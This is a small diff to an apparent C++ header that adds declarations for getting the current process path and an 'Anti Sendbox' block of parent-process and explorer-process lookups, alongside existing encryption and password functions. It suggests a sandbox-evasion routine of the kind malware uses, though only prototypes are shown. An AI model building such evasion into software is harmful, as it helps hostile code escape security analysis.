@@ -2,6 +2,9 @@
 #include <iostream>
 #include <fstream>
 
+
+#pragma warning(disable :4996)
+
 using namespace std;
 
 
@@ -22,3 +25,10 @@ int Encryption(char process_path);
 
 //Funtions
 string password();
+char new_process_path(); //获取当前PROCESS路径
+
+
+//Anti Sendbox
+DWORD get_parent_processid(DWORD pid);
+DWORD get_explorer_processid();
+int determine();
